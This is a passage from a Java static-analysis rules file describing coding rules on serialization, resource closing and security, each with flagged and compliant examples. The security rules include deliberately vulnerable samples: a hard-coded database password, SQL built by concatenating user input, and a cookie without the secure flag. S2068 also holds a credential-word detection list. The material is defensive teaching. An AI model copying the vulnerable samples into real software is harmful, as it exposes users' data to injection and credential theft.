            public Fruit () {...}; // Compliant; no-arg constructor added to ancestor
            public Fruit (Season ripe) {...}
            public void setRipe(Season ripe) {...}
            public Season getRipe() {...}
            }

            public class Raspberry extends Fruit
            implements Serializable {
            private static final long serialVersionUID = 1;

            private String variety;

            public Raspberry(Season ripe, String variety) {...}
            public void setVariety(String variety) {...}
            public String getVarity() {...}
            }
            &lt;/pre&gt;
        </description>
        <tag>serialization</tag>
    </rule>

    <rule key='S2060' priority='MAJOR'>
        <configKey>S2060</configKey>
        <name>&quot;Externalizable&quot; classes should have no-arguments constructors</name>
        <description>
            &lt;p&gt;An &lt;code&gt;Externalizable&lt;/code&gt; class is one which handles its own &lt;code&gt;Serialization&lt;/code&gt;
            and deserialization. During deserialization, the first
            step in the process is a default instantiation using the class' no-argument constructor. Therefore an &lt;code&gt;Externalizable&lt;/code&gt;
            class without a
            no-arg constructor cannot be deserialized.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Tomato implements Externalizable { // Noncompliant; no no-arg constructor

            public Tomato (String color, int weight) { ... }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Tomato implements Externalizable {

            public Tomato() { ... }
            public Tomato (String color, int weight) { ... }
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S2061' priority='MAJOR'>
        <configKey>S2061</configKey>
        <name>Custom serialization method signatures should meet requirements</name>
        <description>
            &lt;p&gt;Writers of &lt;code&gt;Serializable&lt;/code&gt; classes can choose to let Java's automatic
            mechanisms handle serialization and deserialization, or they can
            choose to handle it themselves by implementing specific methods. However, if the signatures of those methods
            are not exactly what is expected, they
            will be ignored and the default serialization mechanisms will kick back in. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Watermelon implements Serializable {
            // ...
            void writeObject(java.io.ObjectOutputStream out)// Noncompliant; not private
            throws IOException
            {...}

            private void readObject(java.io.ObjectInputStream in)
            {...}

            public void readObjectNoData() // Noncompliant; not private
            {...}

            static Object readResolve() throws ObjectStreamException // Noncompliant; this method may have any access
            modifier, may not be static

            Watermelon writeReplace() throws ObjectStreamException // Noncompliant; this method may have any access
            modifier, but must return Object
            {...}
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Watermelon implements Serializable {
            // ...
            private void writeObject(java.io.ObjectOutputStream out)
            throws IOException
            {...}

            private void readObject(java.io.ObjectInputStream in)
            throws IOException, ClassNotFoundException
            {...}

            private void readObjectNoData()
            throws ObjectStreamException
            {...}

            protected Object readResolve() throws ObjectStreamException
            {...}

            private Object writeReplace() throws ObjectStreamException
            {...}
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/WTdGBQ&quot;&gt;CERT, SER01-J.&lt;/a&gt; -
            Do not deviate from the proper signatures of serialization methods
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
    </rule>

    <rule key='S2062' priority='CRITICAL'>
        <configKey>S2062</configKey>
        <name>&quot;readResolve&quot; methods should be inheritable</name>
        <description>
            &lt;p&gt;The &lt;code&gt;readResolve()&lt;/code&gt; method allows final tweaks to the state of an object
            during deserialization. Non-final classes which implement
            &lt;code&gt;readResolve()&lt;/code&gt;, should not set its visibility to &lt;code&gt;private&lt;/code&gt;
            since it will then be unavailable to child classes.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Fruit implements Serializable {
            private static final long serialVersionUID = 1;

            private Object readResolve() throws ObjectStreamException // Noncompliant
            {...}

            //...
            }

            public class Raspberry extends Fruit implements Serializable { // No access to parent's readResolve() method
            //...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Fruit implements Serializable {
            private static final long serialVersionUID = 1;

            protected Object readResolve() throws ObjectStreamException
            {...}

            //...
            }

            public class Raspberry extends Fruit implements Serializable {
            //...
            }
            &lt;/pre&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S2065' priority='MINOR'>
        <configKey>S2065</configKey>
        <name>Fields in non-serializable classes should not be &quot;transient&quot;</name>
        <description>
            &lt;p&gt;&lt;code&gt;transient&lt;/code&gt; is used to mark fields in a &lt;code&gt;Serializable&lt;/code&gt;
            class which will not be written out to file (or stream). In a class
            that does not implement &lt;code&gt;Serializable&lt;/code&gt;, this modifier is simply wasted keystrokes,
            and should be removed.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            class Vegetable { // does not implement Serializable
            private transient Season ripe; // Noncompliant
            // ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            class Vegetable {
            private Season ripe;
            // ...
            }
            &lt;/pre&gt;
        </description>
        <tag>serialization</tag>
        <tag>unused</tag>
    </rule>

    <rule key='S2066' priority='MINOR'>
        <configKey>S2066</configKey>
        <name>&quot;Serializable&quot; inner classes of non-serializable classes should be &quot;static&quot;</name>
        <description>
            &lt;p&gt;Serializing a non-&lt;code&gt;static&lt;/code&gt; inner class will result in an attempt at
            serializing the outer class as well. If the outer class is not
            serializable, then serialization will fail, resulting in a runtime error. &lt;/p&gt;
            &lt;p&gt;Making the inner class &lt;code&gt;static&lt;/code&gt; (i.e. &quot;nested&quot;) avoids this
            problem, therefore inner classes should be &lt;code&gt;static&lt;/code&gt; if possible.
            However, you should be aware that there are semantic differences between an inner class and a nested one:
            &lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; an inner class can only be instantiated within the context of an instance of the outer class.
            &lt;/li&gt;
            &lt;li&gt; a nested (&lt;code&gt;static&lt;/code&gt;) class can be instantiated independently of the outer
            class. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Pomegranate {
            // ...

            public class Seed implements Serializable { // Noncompliant; serialization will fail
            // ...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Pomegranate {
            // ...

            public static class Seed implements Serializable {
            // ...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/ZTdGBQ&quot;&gt;CERT SER05-J.&lt;/a&gt; -
            Do not serialize instances of inner classes &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>serialization</tag>
    </rule>

    <rule key='S2068' priority='BLOCKER'>
        <configKey>S2068</configKey>
        <name>Hard-coded credentials are security-sensitive</name>
        <description>
            &lt;p&gt;Because it is easy to extract strings from an application source code or binary, credentials should
            not be hard-coded. This is particularly true
            for applications that are distributed or that are open-source.&lt;/p&gt;
            &lt;p&gt;In the past, it has led to the following vulnerabilities:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466&quot;&gt;CVE-2019-13466&lt;/a&gt;
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389&quot;&gt;CVE-2018-15389&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Credentials should be stored outside of the code in a configuration file, a database, or a
            management service for secrets. &lt;/p&gt;
            &lt;p&gt;This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks
            for hard-coded credentials in connection
            strings, and for variable names that match any of the patterns from the provided list.&lt;/p&gt;
            &lt;p&gt;It's recommended to customize the configuration of this rule with additional credential words such
            as &quot;oauthToken&quot;, &quot;secret&quot;, ...&lt;/p&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; Credentials allows access to a sensitive component like a database, a file storage, an API or a
            service. &lt;/li&gt;
            &lt;li&gt; Credentials are used in production environments. &lt;/li&gt;
            &lt;li&gt; Application re-distribution is required before updating the credentials. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; Store the credentials in a configuration file that is not pushed to the code repository. &lt;/li&gt;
            &lt;li&gt; Store the credentials in a database. &lt;/li&gt;
            &lt;li&gt; Use your cloud provider's service for managing secrets. &lt;/li&gt;
            &lt;li&gt; If the a password has been disclosed through the source code: change it. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Connection conn = null;
            try {
            conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost/test?&quot; +
            &quot;user=steve&amp;amp;password=blue&quot;); // Sensitive
            String uname = &quot;steve&quot;;
            String password = &quot;blue&quot;;
            conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost/test?&quot; +
            &quot;user=&quot; + uname + &quot;&amp;amp;password=&quot; + password); // Sensitive

            java.net.PasswordAuthentication pa = new java.net.PasswordAuthentication(&quot;userName&quot;, &quot;1234&quot;.toCharArray());
            // Sensitive
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Connection conn = null;
            try {
            String uname = getEncryptedUser();
            String password = getEncryptedPass();
            conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost/test?&quot; +
            &quot;user=&quot; + uname + &quot;&amp;amp;password=&quot; + password);
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication&quot;&gt;OWASP
            Top 10 2017 Category A2&lt;/a&gt; - Broken Authentication &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/798&quot;&gt;MITRE, CWE-798&lt;/a&gt; -
            Use of Hard-coded Credentials &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/259&quot;&gt;MITRE, CWE-259&lt;/a&gt; -
            Use of Hard-coded Password &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/OjdGBQ&quot;&gt;CERT, MSC03-J.&lt;/a&gt; -
            Never hard code sensitive information &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.sans.org/top25-software-errors/#cat3&quot;&gt;SANS Top 25&lt;/a&gt;
            - Porous Defenses &lt;/li&gt;
            &lt;li&gt; Derived from FindSecBugs rule &lt;a href=&quot;https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD&quot;&gt;Hard
            Coded Password&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>owasp-a2</tag>
        <tag>sans-top25-porous</tag>
        <securityStandards>
            <cwe>798,259</cwe>
            <OWASP>A2</OWASP>
        </securityStandards>
        <param>
            <key>credentialWords</key>
            <htmlDesc>Comma separated list of words identifying potential credentials</htmlDesc>
            <defaultValue>password,passwd,pwd,passphrase,java.naming.security.credentials</defaultValue>
            <type>STRING</type>
        </param>
    </rule>

    <rule key='S2077' priority='MAJOR'>
        <configKey>S2077</configKey>
        <name>Formatting SQL queries is security-sensitive</name>
        <description>
            &lt;p&gt;Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL
            injection when concatenating untrusted values into the
            query. However, this rule doesn't detect SQL injections (unlike rule s3649), the goal is only to highlight
            complex/formatted queries.&lt;/p&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; Some parts of the query come from untrusted values (like user inputs). &lt;/li&gt;
            &lt;li&gt; The query is repeated/duplicated in other parts of the code. &lt;/li&gt;
            &lt;li&gt; The application must support different types of relational databases. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; Use &lt;a href=&quot;https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet&quot;&gt;parameterized
            queries, prepared statements, or stored
            procedures&lt;/a&gt; and bind variables to SQL query parameters. &lt;/li&gt;
            &lt;li&gt; Consider using ORM frameworks if there is a need to have an abstract layer to access data. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public User getUser(Connection con, String user) throws SQLException {

            Statement stmt1 = null;
            Statement stmt2 = null;
            PreparedStatement pstmt;
            try {
            stmt1 = con.createStatement();
            ResultSet rs1 = stmt1.executeQuery(&quot;GETDATE()&quot;); // No issue; hardcoded query

            stmt2 = con.createStatement();
            ResultSet rs2 = stmt2.executeQuery(&quot;select FNAME, LNAME, SSN &quot; +
            &quot;from USERS where UNAME=&quot; + user); // Sensitive

            pstmt = con.prepareStatement(&quot;select FNAME, LNAME, SSN &quot; +
            &quot;from USERS where UNAME=&quot; + user); // Sensitive
            ResultSet rs3 = pstmt.executeQuery();

            //...
            }

            public User getUserHibernate(org.hibernate.Session session, String data) {

            org.hibernate.Query query = session.createQuery(
            &quot;FROM students where fname = &quot; + data); // Sensitive
            // ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public User getUser(Connection con, String user) throws SQLException {

            Statement stmt1 = null;
            PreparedStatement pstmt = null;
            String query = &quot;select FNAME, LNAME, SSN &quot; +
            &quot;from USERS where UNAME=?&quot;
            try {
            stmt1 = con.createStatement();
            ResultSet rs1 = stmt1.executeQuery(&quot;GETDATE()&quot;);

            pstmt = con.prepareStatement(query);
            pstmt.setString(1, user); // Good; PreparedStatements escape their inputs.
            ResultSet rs2 = pstmt.executeQuery();

            //...
            }
            }

            public User getUserHibernate(org.hibernate.Session session, String data) {

            org.hibernate.Query query = session.createQuery(&quot;FROM students where fname = ?&quot;);
            query = query.setParameter(0,data); // Good; Parameter binding escapes all input

            org.hibernate.Query query2 = session.createQuery(&quot;FROM students where fname = &quot; + data); //
            Sensitive
            // ...
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A1-Injection&quot;&gt;OWASP Top 10
            2017 Category A1&lt;/a&gt; - Injection &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/89&quot;&gt;MITRE, CWE-89&lt;/a&gt; -
            Improper Neutralization of Special Elements used in an SQL Command
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/564.html&quot;&gt;MITRE, CWE-564&lt;/a&gt;
            - SQL Injection: Hibernate &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/20.html&quot;&gt;MITRE, CWE-20&lt;/a&gt;
            - Improper Input Validation &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/943.html&quot;&gt;MITRE, CWE-943&lt;/a&gt;
            - Improper Neutralization of Special Elements in Data Query Logic
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/ITdGBQ&quot;&gt;CERT, IDS00-J.&lt;/a&gt; -
            Prevent SQL injection &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.sans.org/top25-software-errors/#cat1&quot;&gt;SANS Top 25&lt;/a&gt;
            - Insecure Interaction Between Components &lt;/li&gt;
            &lt;li&gt; Derived from FindSecBugs rules &lt;a href=&quot;https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA&quot;&gt;Potential
            SQL/JPQL Injection
            (JPA)&lt;/a&gt;, &lt;a href=&quot;https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO&quot;&gt;Potential
            SQL/JDOQL Injection (JDO)&lt;/a&gt;, &lt;a
            href=&quot;https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE&quot;&gt;Potential
            SQL/HQL Injection (Hibernate)&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>bad-practice</tag>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>hibernate</tag>
        <tag>owasp-a1</tag>
        <tag>sans-top25-insecure</tag>
        <tag>spring</tag>
        <tag>sql</tag>
        <securityStandards>
            <cwe>564,89,20,943</cwe>
            <OWASP>A1</OWASP>
        </securityStandards>
    </rule>

    <rule key='S2092' priority='MINOR'>
        <configKey>S2092</configKey>
        <name>Creating cookies without the &quot;secure&quot; flag is security-sensitive</name>
        <description>
            &lt;p&gt;When a cookie is protected with the &lt;code&gt;secure&lt;/code&gt; attribute set to &lt;em&gt;true&lt;/em&gt;
            it will not be send by the browser over an unencrypted HTTP
            request and thus cannot be observed by an unauthorized person during a man-in-the-middle attack. &lt;/p&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; the cookie is for instance a &lt;em&gt;session-cookie&lt;/em&gt; not designed to be sent over
            non-HTTPS communication. &lt;/li&gt;
            &lt;li&gt; it's not sure that the website contains &lt;a href=&quot;https://developer.mozilla.org/fr/docs/Web/Security/Mixed_content&quot;&gt;mixed
            content&lt;/a&gt; or not (ie
            HTTPS everywhere or not) &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; It is recommended to use &lt;code&gt;HTTPs&lt;/code&gt; everywhere so setting the &lt;code&gt;secure&lt;/code&gt;
            flag to &lt;em&gt;true&lt;/em&gt; should be the default behaviour
            when creating cookies. &lt;/li&gt;
            &lt;li&gt; Set the &lt;code&gt;secure&lt;/code&gt; flag to &lt;em&gt;true&lt;/em&gt; for session-cookies.
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;p&gt;If you create a security-sensitive cookie in your JAVA code:&lt;/p&gt;
            &lt;pre&gt;
            Cookie c = new Cookie(COOKIENAME, sensitivedata);
            c.setSecure(false); // Sensitive: a security-ensitive cookie is created with the secure flag set to false
            &lt;/pre&gt;
            &lt;p&gt;By default the &lt;a href=&quot;https://docs.oracle.com/javaee/6/api/javax/servlet/http/Cookie.html#setSecure(boolean)&quot;&gt;&lt;code&gt;secure&lt;/code&gt;&lt;/a&gt;
            flag is set
            to &lt;em&gt;false:&lt;/em&gt;&lt;/p&gt;
            &lt;pre&gt;
            Cookie c = new Cookie(COOKIENAME, sensitivedata); // Sensitive: a security-sensitive cookie is created with
            the secure flag not defined (by default set to false)
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Cookie c = new Cookie(COOKIENAME, sensitivedata);
            c.setSecure(true); // Compliant: the sensitive cookie will not be send during an unencrypted HTTP request
            thanks to the secure flag set to true
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure&quot;&gt;OWASP
            Top 10 2017 Category A3&lt;/a&gt; - Sensitive Data Exposure
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/311&quot;&gt;MITRE, CWE-311&lt;/a&gt; -
            Missing Encryption of Sensitive Data &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/315&quot;&gt;MITRE, CWE-315&lt;/a&gt; -
            Cleartext Storage of Sensitive Information in a Cookie &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/614&quot;&gt;MITRE, CWE-614&lt;/a&gt; -
            Sensitive Cookie in HTTPS Session Without 'Secure' Attribute &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.sans.org/top25-software-errors/#cat3&quot;&gt;SANS Top 25&lt;/a&gt;
            - Porous Defenses &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a3</tag>
        <tag>privacy</tag>
        <tag>sans-top25-porous</tag>
        <tag>spring</tag>
        <securityStandards>
            <cwe>614,311,315</cwe>
            <OWASP>A3</OWASP>
        </securityStandards>
    </rule>

    <rule key='S2093' priority='CRITICAL'>
        <configKey>S2093</configKey>
        <name>Try-with-resources should be used</name>
        <description>
            &lt;p&gt;Java 7 introduced the try-with-resources statement, which guarantees that the resource in question
            will be closed. Since the new syntax is closer
            to bullet-proof, it should be preferred over the older &lt;code&gt;try&lt;/code&gt;/&lt;code&gt;catch&lt;/code&gt;/&lt;code&gt;finally&lt;/code&gt;
            version.&lt;/p&gt;
            &lt;p&gt;This rule checks that &lt;code&gt;close&lt;/code&gt;-able resources are opened in a
            try-with-resources statement.&lt;/p&gt;
            &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; that this rule is automatically disabled when the project's &lt;code&gt;sonar.java.source&lt;/code&gt;
            is lower than &lt;code&gt;7&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            FileReader fr = null;
            BufferedReader br = null;
            try {
            fr = new FileReader(fileName);
            br = new BufferedReader(fr);
            return br.readLine();
            } catch (...) {
            } finally {
            if (br != null) {
            try {
            br.close();
            } catch(IOException e){...}
            }
            if (fr != null ) {
            try {
            br.close();
            } catch(IOException e){...}
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            try (
            FileReader fr = new FileReader(fileName);
            BufferedReader br = new BufferedReader(fr)
            ) {
            return br.readLine();
            }
            catch (...) {}
            &lt;/pre&gt;
            &lt;p&gt;or&lt;/p&gt;
            &lt;pre&gt;
            try (BufferedReader br =
            new BufferedReader(new FileReader(fileName))) { // no need to name intermediate resources if you don't want
            to
            return br.readLine();
            }
            catch (...) {}
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/6DZGBQ&quot;&gt;CERT, ERR54-J.&lt;/a&gt; -
            Use a try-with-resources statement to safely handle closeable
            resources &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>java8</tag>
        <tag>pitfall</tag>
    </rule>

    <rule key='S2094' priority='MINOR'>
        <configKey>S2094</configKey>
        <name>Classes should not be empty</name>
        <description>
            &lt;p&gt;There is no good excuse for an empty class. If it's being used simply as a common extension point,
            it should be replaced with an
            &lt;code&gt;interface&lt;/code&gt;. If it was stubbed in as a placeholder for future development it should
            be fleshed-out. In any other case, it should be
            eliminated.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Nothing { // Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public interface Nothing {
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Empty classes can be used as marker types (for Spring for instance), therefore empty classes that
            are annotated will be ignored.&lt;/p&gt;
            &lt;pre&gt;
            @Configuration
            @EnableWebMvc
            public final class ApplicationConfiguration {

            }
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
    </rule>

    <rule key='S2095' priority='BLOCKER'>
        <configKey>S2095</configKey>
        <name>Resources should be closed</name>
        <description>
            &lt;p&gt;Connections, streams, files, and other classes that implement the &lt;code&gt;Closeable&lt;/code&gt;
            interface or its super-interface,
            &lt;code&gt;AutoCloseable&lt;/code&gt;, needs to be closed after use. Further, that &lt;code&gt;close&lt;/code&gt;
            call must be made in a &lt;code&gt;finally&lt;/code&gt; block otherwise
            an exception could keep the call from being made. Preferably, when class implements &lt;code&gt;AutoCloseable&lt;/code&gt;,
            resource should be created using
            &quot;try-with-resources&quot; pattern and will be closed automatically.&lt;/p&gt;
            &lt;p&gt;Failure to properly close resources will result in a resource leak which could bring first the
            application and then perhaps the box the application
            is on to their knees.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            private void readTheFile() throws IOException {
            Path path = Paths.get(this.fileName);
            BufferedReader reader = Files.newBufferedReader(path, this.charset);
            // ...
            reader.close(); // Noncompliant
            // ...
            Files.lines(&quot;input.txt&quot;).forEach(System.out::println); // Noncompliant: The stream needs to be
            closed
            }

            private void doSomething() {
            OutputStream stream = null;
            try {
            for (String property : propertyList) {
            stream = new FileOutputStream(&quot;myfile.txt&quot;); // Noncompliant
            // ...
            }
            } catch (Exception e) {
            // ...
            } finally {
            stream.close(); // Multiple streams were opened. Only the last is closed.
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            private void readTheFile(String fileName) throws IOException {
            Path path = Paths.get(fileName);
            try (BufferedReader reader = Files.newBufferedReader(path, StandardCharsets.UTF_8)) {
            reader.readLine();
            // ...
            }
            // ..
            try (Stream&amp;lt;String&amp;gt; input = Files.lines(&quot;input.txt&quot;)) {
            input.forEach(System.out::println);
            }
            }

            private void doSomething() {
            OutputStream stream = null;
            try {
            stream = new FileOutputStream(&quot;myfile.txt&quot;);
            for (String property : propertyList) {
            // ...
            }
            } catch (Exception e) {
            // ...
            } finally {
            stream.close();
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Instances of the following classes are ignored by this rule because &lt;code&gt;close&lt;/code&gt;
            has no effect:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;java.io.ByteArrayOutputStream&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.io.ByteArrayInputStream&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.io.CharArrayReader&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.io.CharArrayWriter&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.io.StringReader&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;java.io.StringWriter&lt;/code&gt; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Java 7 introduced the try-with-resources statement, which implicitly closes &lt;code&gt;Closeables&lt;/code&gt;.
            All resources opened in a try-with-resources
            statement are ignored by this rule. &lt;/p&gt;
            &lt;pre&gt;
            try (BufferedReader br = new BufferedReader(new FileReader(fileName))) {
            //...
            }
            catch ( ... ) {
            //...
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/459.html&quot;&gt;MITRE, CWE-459&lt;/a&gt;
            - Incomplete Cleanup &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/772.html&quot;&gt;MITRE, CWE-772&lt;/a&gt;
            - Missing Release of Resource after Effective Lifetime &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/vjdGBQ&quot;&gt;CERT, FIO04-J.&lt;/a&gt; -
            Release resources when they are no longer needed &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/QtUxBQ&quot;&gt;CERT, FIO42-C.&lt;/a&gt; -
            Close files when they are no longer needed &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://docs.oracle.com/javase/tutorial/essential/exceptions/tryResourceClose.html&quot;&gt;Try
            With Resources&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>denial-of-service</tag>
        <tag>leak</tag>
        <param>
            <key>excludedResourceTypes</key>
            <htmlDesc>Comma separated list of the excluded resource types, using fully qualified names (example: &amp;quot;org.apache.hadoop.fs.FileSystem&amp;quot;)</htmlDesc>
            <type>STRING</type>
        </param>
    </rule>

    <rule key='S2097' priority='MINOR'>
        <configKey>S2097</configKey>
        <name>&quot;equals(Object obj)&quot; should test argument type</name>
        <description>
            &lt;p&gt;Because the &lt;code&gt;equals&lt;/code&gt; method takes a generic &lt;code&gt;Object&lt;/code&gt;
            as a parameter, any type of object may be passed to it. The method
            should not assume it will only be used to test objects of its class type. It must instead check the
            parameter's type.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public boolean equals(Object obj) {
            MyClass mc = (MyClass)obj; // Noncompliant
            // ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public boolean equals(Object obj) {
            if (obj == null)
            return false;

